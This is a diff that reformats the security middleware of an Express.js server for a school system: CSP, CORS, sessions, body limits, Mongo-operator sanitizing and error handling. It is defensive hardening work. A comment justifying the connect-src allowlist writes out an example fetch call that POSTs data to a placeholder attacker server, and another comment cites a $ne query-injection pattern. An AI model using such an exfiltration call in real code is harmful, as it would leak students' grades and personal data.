@@ -55,94 +55,118 @@ const { obterHashes } = require('./utils/cspHashes');
 // Restam os handlers inline (`onclick=`), cobertos por `script-src-attr` —
 // diretiva separada, endurecida abaixo.
 // ============================================
-app.use(helmet({
-    contentSecurityPolicy: {
-        directives: {
-            "default-src": ["'self'"],
-            // Função: helmet reavalia por resposta, o que permite ao cache de
-            // hashes revalidar por mtime em desenvolvimento (editar um script
-            // inline não exige reiniciar o servidor).
-            "script-src": [
-                "'self'",
-                ...["cdn.jsdelivr.net", "unpkg.com", "cdnjs.cloudflare.com", "cdn.tailwindcss.com", "https://accounts.google.com"],
-                () => obterHashes(frontendRootPath).join(' ')
-            ],
-            // Handlers inline (onclick=...) do HTML legado. Continua sendo uma
-            // exceção, mas MUITO mais estreita que a anterior: vale só para
-            // atributos de evento, nunca para blocos <script>. Fechar isto de
-            // vez exige reescrever os ~174 handlers como addEventListener.
-            "script-src-attr": ["'unsafe-inline'"],
-            "style-src": ["'self'", "'unsafe-inline'", "cdn.jsdelivr.net", "fonts.googleapis.com", "unpkg.com", "cdnjs.cloudflare.com", "https://accounts.google.com"],
-            "font-src": ["'self'", "cdn.jsdelivr.net", "fonts.gstatic.com", "data:"],
-            // Google profile photos (lh3.googleusercontent.com) + blobs/data URIs
-            "img-src": ["'self'", "data:", "blob:", "https://lh3.googleusercontent.com", "https://lh4.googleusercontent.com", "https://lh5.googleusercontent.com", "https://lh6.googleusercontent.com"],
-            "media-src": ["'self'", "blob:"],
-            // ============================================
-            // connect-src — ALLOWLIST, sem esquemas curinga
-            // ============================================
-            // A lista terminava em `https: http: ws: wss:`, que autoriza QUALQUER
-            // host. Isso reabre justamente o que o resto da CSP fecha: um script
-            // que consiga executar (via `script-src-attr: 'unsafe-inline'`, ainda
-            // aberto para os ~174 handlers legados) podia fazer
-            // `fetch('https://servidor-do-atacante/', {method:'POST', body: ...})`
-            // e drenar nota, frequência e dado de menor sem obstáculo nenhum.
-            // A CSP só vira barreira de EXFILTRAÇÃO quando o destino é enumerado.
-            //
-            // Cada entrada abaixo tem um chamador real no código:
-            //   - onrender.com  → a própria API em produção (HTTP e WebSocket);
-            //   - localhost/127 → dev (Vite, Live Server, socket.io local);
-            //   - viacep        → busca de endereço por CEP no cadastro;
-            //   - *.google*     → OAuth (o portal chama oauth2/www.googleapis);
-            //   - CDNs          → mesmas de `script-src`, que buscam chunks e
-            //                     sourcemaps por fetch.
-            // `data:`/`blob:` ficam: são origens locais ao documento, não dão
-            // saída para a rede.
-            "connect-src": [
-                "'self'",
-                "https://sistema-escolar-bfty.onrender.com",
-                "wss://sistema-escolar-bfty.onrender.com",
-                "http://localhost:*",
-                "http://127.0.0.1:*",
-                "ws://localhost:*",
-                "ws://127.0.0.1:*",
-                "https://viacep.com.br",
-                "https://accounts.google.com",
-                "https://oauth2.googleapis.com",
-                "https://www.googleapis.com",
-                "https://cdn.jsdelivr.net",
-                "https://cdnjs.cloudflare.com",
-                "https://unpkg.com",
-                "https://cdn.tailwindcss.com",
-                "data:",
-                "blob:"
-            ],
-            "frame-src": ["'self'", "https://accounts.google.com"], // Necessário para o Iframe de login do Google
-            "frame-ancestors": ["'none'"], // Proteção extra contra Clickjacking
-            "base-uri": ["'self'"],         // Previne ataques de base tag injection
-            "form-action": ["'self'"]       // Previne submissão de formulários para domínios externos
-        }
-    },
-    // ============================================
-    // CLICKJACKING — defesa explícita em duas camadas
-    // ============================================
-    // `frame-ancestors 'none'` (CSP, acima) é o controle moderno, mas não é
-    // honrado por browsers antigos. O X-Frame-Options cobre esse resto.
-    // Deixado EXPLÍCITO em DENY em vez de herdar o SAMEORIGIN padrão do helmet:
-    // além de ser mais restritivo, torna a intenção auditável e consistente com
-    // o `frame-ancestors 'none'` — antes as duas diretivas discordavam.
-    xFrameOptions: { action: 'deny' },
+app.use(
+    helmet({
+        contentSecurityPolicy: {
+            directives: {
+                'default-src': ["'self'"],
+                // Função: helmet reavalia por resposta, o que permite ao cache de
+                // hashes revalidar por mtime em desenvolvimento (editar um script
+                // inline não exige reiniciar o servidor).
+                'script-src': [
+                    "'self'",
+                    ...[
+                        'cdn.jsdelivr.net',
+                        'unpkg.com',
+                        'cdnjs.cloudflare.com',
+                        'cdn.tailwindcss.com',
+                        'https://accounts.google.com',
+                    ],
+                    () => obterHashes(frontendRootPath).join(' '),
+                ],
+                // Handlers inline (onclick=...) do HTML legado. Continua sendo uma
+                // exceção, mas MUITO mais estreita que a anterior: vale só para
+                // atributos de evento, nunca para blocos <script>. Fechar isto de
+                // vez exige reescrever os ~174 handlers como addEventListener.
+                'script-src-attr': ["'unsafe-inline'"],
+                'style-src': [
+                    "'self'",
+                    "'unsafe-inline'",
+                    'cdn.jsdelivr.net',
+                    'fonts.googleapis.com',
+                    'unpkg.com',
+                    'cdnjs.cloudflare.com',
+                    'https://accounts.google.com',
+                ],
+                'font-src': ["'self'", 'cdn.jsdelivr.net', 'fonts.gstatic.com', 'data:'],
+                // Google profile photos (lh3.googleusercontent.com) + blobs/data URIs
+                'img-src': [
+                    "'self'",
+                    'data:',
+                    'blob:',
+                    'https://lh3.googleusercontent.com',
+                    'https://lh4.googleusercontent.com',
+                    'https://lh5.googleusercontent.com',
+                    'https://lh6.googleusercontent.com',
+                ],
+                'media-src': ["'self'", 'blob:'],
+                // ============================================
+                // connect-src — ALLOWLIST, sem esquemas curinga
+                // ============================================
+                // A lista terminava em `https: http: ws: wss:`, que autoriza QUALQUER
+                // host. Isso reabre justamente o que o resto da CSP fecha: um script
+                // que consiga executar (via `script-src-attr: 'unsafe-inline'`, ainda
+                // aberto para os ~174 handlers legados) podia fazer
+                // `fetch('https://servidor-do-atacante/', {method:'POST', body: ...})`
+                // e drenar nota, frequência e dado de menor sem obstáculo nenhum.
+                // A CSP só vira barreira de EXFILTRAÇÃO quando o destino é enumerado.
+                //
+                // Cada entrada abaixo tem um chamador real no código:
+                //   - onrender.com  → a própria API em produção (HTTP e WebSocket);
+                //   - localhost/127 → dev (Vite, Live Server, socket.io local);
+                //   - viacep        → busca de endereço por CEP no cadastro;
+                //   - *.google*     → OAuth (o portal chama oauth2/www.googleapis);
+                //   - CDNs          → mesmas de `script-src`, que buscam chunks e
+                //                     sourcemaps por fetch.
+                // `data:`/`blob:` ficam: são origens locais ao documento, não dão
+                // saída para a rede.
+                'connect-src': [
+                    "'self'",
+                    'https://sistema-escolar-bfty.onrender.com',
+                    'wss://sistema-escolar-bfty.onrender.com',
+                    'http://localhost:*',
+                    'http://127.0.0.1:*',
+                    'ws://localhost:*',
+                    'ws://127.0.0.1:*',
+                    'https://viacep.com.br',
+                    'https://accounts.google.com',
+                    'https://oauth2.googleapis.com',
+                    'https://www.googleapis.com',
+                    'https://cdn.jsdelivr.net',
+                    'https://cdnjs.cloudflare.com',
+                    'https://unpkg.com',
+                    'https://cdn.tailwindcss.com',
+                    'data:',
+                    'blob:',
+                ],
+                'frame-src': ["'self'", 'https://accounts.google.com'], // Necessário para o Iframe de login do Google
+                'frame-ancestors': ["'none'"], // Proteção extra contra Clickjacking
+                'base-uri': ["'self'"], // Previne ataques de base tag injection
+                'form-action': ["'self'"], // Previne submissão de formulários para domínios externos
+            },
+        },
+        // ============================================
+        // CLICKJACKING — defesa explícita em duas camadas
+        // ============================================
+        // `frame-ancestors 'none'` (CSP, acima) é o controle moderno, mas não é
+        // honrado por browsers antigos. O X-Frame-Options cobre esse resto.
+        // Deixado EXPLÍCITO em DENY em vez de herdar o SAMEORIGIN padrão do helmet:
+        // além de ser mais restritivo, torna a intenção auditável e consistente com
+        // o `frame-ancestors 'none'` — antes as duas diretivas discordavam.
+        xFrameOptions: { action: 'deny' },
 
-    // Não vaza a URL completa (que pode conter ids de aluno/turma no path) para
-    // terceiros ao navegar para fora ou carregar recurso externo.
-    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
+        // Não vaza a URL completa (que pode conter ids de aluno/turma no path) para
+        // terceiros ao navegar para fora ou carregar recurso externo.
+        referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
 
-    // HSTS: 1 ano, subdomínios incluídos. Impede downgrade para HTTP.
-    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
+        // HSTS: 1 ano, subdomínios incluídos. Impede downgrade para HTTP.
+        hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
 
-    // Necessário para o popup do Google OAuth comunicar de volta com a página pai
-    crossOriginOpenerPolicy: { policy: 'same-origin-allow-popups' },
-    crossOriginEmbedderPolicy: false, // Desabilitado para compatibilidade com CDNs
-}));
+        // Necessário para o popup do Google OAuth comunicar de volta com a página pai
+        crossOriginOpenerPolicy: { policy: 'same-origin-allow-popups' },
+        crossOriginEmbedderPolicy: false, // Desabilitado para compatibilidade com CDNs
+    })
+);
 
 // Cabeçalhos anti-clickjacking também nas respostas de arquivo estático e nas
 // páginas de erro, que em alguns caminhos não passam pela cadeia acima.
@@ -164,7 +188,7 @@ const staticDirectories = [
     'direcao',
     'graficos',
     'favicon',
-    'portal-responsavel/dist'
+    'portal-responsavel/dist',
 ];
 const staticFiles = [
     'index.html',
@@ -172,13 +196,13 @@ const staticFiles = [
     'sw.js',
     'service-worker.js',
     'favicon.ico',
-    'favicon.svg'
+    'favicon.svg',
 ];
 const staticOptions = {
     setHeaders: (res, filePath) => {
         if (filePath.endsWith('.woff2')) res.setHeader('Content-Type', 'font/woff2');
         if (filePath.endsWith('.woff')) res.setHeader('Content-Type', 'font/woff');
-    }
+    },
 };
 
 // ============================================
@@ -259,7 +283,7 @@ const {
     authContaLimiter,
     codeIpLimiter,
     codeContaLimiter,
-    authPrefixLimiter
+    authPrefixLimiter,
 } = require('./middleware/rateLimiters');
 
 // Aplicar o globalLimiter APENAS em rotas /api
@@ -286,16 +310,18 @@ const allowedOrigins = [
     'http://127.0.0.1:3001',
     'http://127.0.0.1:5500',
     'https://sistema-escolar-bfty.onrender.com',
-    process.env.FRONTEND_URL
+    process.env.FRONTEND_URL,
 ].filter(Boolean); // Remove undefined/null
 
 // Origens extras liberadas por ambiente (lista separada por vírgula).
 // Permite adicionar um domínio de staging sem reabrir a reflexão geral.
 (process.env.CORS_EXTRA_ORIGINS || '')
     .split(',')
-    .map(o => o.trim())
+    .map((o) => o.trim())
     .filter(Boolean)
-    .forEach(o => allowedOrigins.push(o));
+    .forEach((o) => {
+        allowedOrigins.push(o);
+    });
 
 // Apenas fora de produção: loopback em qualquer porta (Vite, Live Server…).
 const LOOPBACK_DEV = /^https?:\/\/(localhost|127\.0\.0\.1|\[::1\]):\d+$/;
@@ -306,35 +332,43 @@ function origemPermitida(origin) {
     return false;
 }
 
-app.use(cors({
-    origin: function (origin, callback) {
-        // Sem header Origin = requisição não-browser (curl, Postman, app mobile,
-        // health check). Não há política de mesma origem a violar e nenhum
-        // cookie é anexado automaticamente, então liberar aqui não expõe nada.
-        if (!origin) return callback(null, true);
+app.use(
+    cors({
+        origin: (origin, callback) => {
+            // Sem header Origin = requisição não-browser (curl, Postman, app mobile,
+            // health check). Não há política de mesma origem a violar e nenhum
+            // cookie é anexado automaticamente, então liberar aqui não expõe nada.
+            if (!origin) return callback(null, true);
 
-        if (origemPermitida(origin)) {
-            return callback(null, true);
-        }
+            if (origemPermitida(origin)) {
+                return callback(null, true);
+            }
 
-        console.error(`❌ Bloqueado por CORS: ${origin}`);
-        // Erro SEM ecoar a origin recebida: a mensagem volta ao cliente pelo
-        // handler global e refletir input do atacante ali é desnecessário.
-        //
-        // `status = 403` é essencial: sem ele o handler global trata como 500 e
-        // dispara um alerta FATAL 'UNHANDLED_ERROR'. Origem bloqueada é o
-        // funcionamento ESPERADO do controle — qualquer um inundaria o canal de
-        // alertas só mandando requests com Origin aleatória.
-        const erro = new Error('Origem não autorizada');
-        erro.status = 403;
-        return callback(erro);
-    },
-    credentials: true,
-    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-    allowedHeaders: ['Content-Type', 'Authorization', 'x-migration-key', 'X-API-Key', 'X-CSRF-Token'],
-    // Sem isso o browser refaz o preflight a cada request.
-    maxAge: 600
-}));
+            console.error(`❌ Bloqueado por CORS: ${origin}`);
+            // Erro SEM ecoar a origin recebida: a mensagem volta ao cliente pelo
+            // handler global e refletir input do atacante ali é desnecessário.
+            //
+            // `status = 403` é essencial: sem ele o handler global trata como 500 e
+            // dispara um alerta FATAL 'UNHANDLED_ERROR'. Origem bloqueada é o
+            // funcionamento ESPERADO do controle — qualquer um inundaria o canal de
+            // alertas só mandando requests com Origin aleatória.
+            const erro = new Error('Origem não autorizada');
+            erro.status = 403;
+            return callback(erro);
+        },
+        credentials: true,
+        methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+        allowedHeaders: [
+            'Content-Type',
+            'Authorization',
+            'x-migration-key',
+            'X-API-Key',
+            'X-CSRF-Token',
+        ],
+        // Sem isso o browser refaz o preflight a cada request.
+        maxAge: 600,
+    })
+);
 
 app.use(cookieParser());
 
@@ -355,8 +389,8 @@ const sessionOptions = {
         httpOnly: true,
         secure: process.env.NODE_ENV === 'production',
         sameSite: 'Lax',
-        maxAge: 8 * 60 * 60 * 1000 // mesmo horizonte do JWT (8h)
-    }
+        maxAge: 8 * 60 * 60 * 1000, // mesmo horizonte do JWT (8h)
+    },
 };
 if (process.env.MONGODB_URI && process.env.NODE_ENV !== 'test') {
     const connectMongo = require('connect-mongo');
@@ -365,23 +399,29 @@ if (process.env.MONGODB_URI && process.env.NODE_ENV !== 'test') {
         mongoUrl: process.env.MONGODB_URI,
         dbName: process.env.MONGODB_DB_NAME || undefined,
         collectionName: 'sessions',
-        ttl: 8 * 60 * 60
+        ttl: 8 * 60 * 60,
     });
 }
 app.use(session(sessionOptions));
 
 // Body Parser - Limite reduzido para 1MB para prevenir DoS
-app.use(express.json({ limit: '1mb' })); 
+app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true, limit: '1mb' }));
 
 // Middlewares locais para uploads de fotos (permitem até 10MB)
 const photoLimit = express.json({ limit: '10mb' });
-app.use('/api/alunos', (req, res, next) => req.method === 'POST' ? photoLimit(req, res, next) : next());
+app.use('/api/alunos', (req, res, next) =>
+    req.method === 'POST' ? photoLimit(req, res, next) : next()
+);
 app.use('/api/upload/photo', photoLimit);
 // Upload de foto de perfil via base64 — precisa do limite estendido
-app.use('/api/usuarios/foto', (req, res, next) => req.method === 'PUT' ? photoLimit(req, res, next) : next());
+app.use('/api/usuarios/foto', (req, res, next) =>
+    req.method === 'PUT' ? photoLimit(req, res, next) : next()
+);
 // Comunicados podem include imagens base64 — precisa do limite estendido
-app.use('/api/comunicados', (req, res, next) => (req.method === 'POST' || req.method === 'PUT') ? photoLimit(req, res, next) : next());
+app.use('/api/comunicados', (req, res, next) =>
+    req.method === 'POST' || req.method === 'PUT' ? photoLimit(req, res, next) : next()
+);
 
 // Sanitização Global de Inputs (XSS e NoSQL Injection Protection)
 // req.query e req.params também passam aqui: com `extended: true` o Express
@@ -414,8 +454,8 @@ function removerOperadoresMongo(alvo) {
         if (Array.isArray(valor)) {
             // ?t[]=a&t[]=b é legítimo: mantém, mas só com valores escalares
             alvo[chave] = valor
-                .filter(v => typeof v !== 'object' || v === null)
-                .map(v => (typeof v === 'string' ? sanitizeInput(v) : v));
+                .filter((v) => typeof v !== 'object' || v === null)
+                .map((v) => (typeof v === 'string' ? sanitizeInput(v) : v));
         } else if (valor && typeof valor === 'object') {
             // ?campo[$ne]=x → objeto. Nada legítimo em query string precisa
             // de operadores Mongo, então o parâmetro inteiro é descartado.
@@ -452,7 +492,9 @@ function removerOperadoresMongoProfundo(alvo, profundidade = 0) {
     if (!alvo || typeof alvo !== 'object' || profundidade > PROFUNDIDADE_MAX) return;
 
     if (Array.isArray(alvo)) {
-        alvo.forEach(item => removerOperadoresMongoProfundo(item, profundidade + 1));
+        alvo.forEach((item) => {
+            removerOperadoresMongoProfundo(item, profundidade + 1);
+        });
         return;
     }
 
@@ -529,7 +571,7 @@ app.use((err, req, res, next) => {
     if (err.type === 'entity.too.large' || err.status === 413) {
         return res.status(413).json({
             success: false,
-            error: 'O tamanho total das imagens excede o limite permitido (10MB). Reduza o tamanho ou quantidade das imagens.'
+            error: 'O tamanho total das imagens excede o limite permitido (10MB). Reduza o tamanho ou quantidade das imagens.',
         });
     }
 
@@ -544,7 +586,7 @@ app.use((err, req, res, next) => {
     if (statusCode >= 500) {
         logger.alert('UNHANDLED_ERROR', err.message, { status: statusCode });
     }
-    
+
     const isProduction = process.env.NODE_ENV === 'production';
 
     // Navegação de página (não-API, aceita HTML) → página de erro amigável
@@ -557,7 +599,7 @@ app.use((err, req, res, next) => {
         success: false,
         message: isProduction ? 'Erro interno do servidor.' : err.message,
         // Detalhes extras apenas em dev
-        error: isProduction ? {} : err
+        error: isProduction ? {} : err,
     });
 });
 
